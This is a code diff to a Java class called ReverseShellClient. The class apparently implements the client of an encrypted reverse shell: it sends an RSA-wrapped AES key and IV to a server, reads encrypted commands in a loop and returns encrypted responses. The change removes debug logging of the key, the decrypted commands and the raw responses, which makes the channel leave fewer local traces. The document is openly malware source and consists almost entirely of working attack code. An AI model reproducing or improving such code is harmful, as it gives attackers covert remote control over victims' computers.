@@ -48,11 +48,9 @@ public class ReverseShellClient {
 
     private void sendAESKey() throws Exception {
         String aesKeyBase64 = CryptoUtils.secretKeyToBase64(Constants.AES_SECRET_KEY);
-        System.out.println("AES Key (Base64): " + aesKeyBase64); // Debug log
         String encryptedAESKey = CryptoUtils.encryptRSA(aesKeyBase64, serverPublicKey);
         out.println(encryptedAESKey);
         out.println(CryptoUtils.ivToBase64(Constants.IV)); // Send IV to server
-        System.out.println("IV (Base64): " + CryptoUtils.ivToBase64(Constants.IV)); // Debug log
         System.out.println("[*] AES key and IV sent to server.");
     }
 
@@ -60,7 +58,6 @@ public class ReverseShellClient {
         String encryptedCommand;
         while ((encryptedCommand = in.readLine()) != null) {
             String command = decryptCommand(encryptedCommand);
-            System.out.println("Decrypted Command: " + command); // Debug log
 
             if (command.equalsIgnoreCase("exit")) {
                 System.out.println("[-] Server disconnected.");
@@ -118,9 +115,7 @@ public class ReverseShellClient {
 
     private void sendResponse(String response) {
         try {
-            System.out.println("Raw Response before Encryption: " + response); // Debug log
             String encryptedResponse = CryptoUtils.encryptAES(response, Constants.AES_SECRET_KEY, Constants.IV);
-            System.out.println("Encrypted Response (Base64): " + encryptedResponse); // Debug log
             out.println(encryptedResponse);
         } catch (Exception e) {
             System.err.println("Error encrypting response: " + e.getMessage());
